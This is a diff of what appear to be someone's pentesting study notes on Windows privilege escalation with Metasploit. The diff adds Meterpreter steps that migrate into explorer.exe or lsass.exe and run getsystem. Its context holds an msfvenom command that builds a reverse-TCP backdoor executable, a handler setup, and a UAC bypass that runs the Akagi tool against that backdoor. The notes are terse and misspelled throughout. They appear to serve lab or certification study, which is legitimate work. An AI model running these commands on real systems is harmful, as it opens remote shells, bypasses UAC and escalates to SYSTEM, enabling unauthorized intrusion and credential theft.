@@ -162,12 +162,16 @@ upload ~/filelocation # upload files in msfconsole to widnows
 + UAC is user access control UAC is used to ensure that changes to the operating sysem requrie approval from the admisntrator or a user account that is part of the local group
 + AutoElevate
 ```
+ps -S explorer.exe
+migrate PID
+getsystem
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe
 use multihandler
 upload backdoor.exe and akagi64.exe
 .\Akagair64.exe 23 location of backdoor
 
-ps
+ps -S lsass.exe
 migarte ps_num #pick nt authorithy
 
 ```
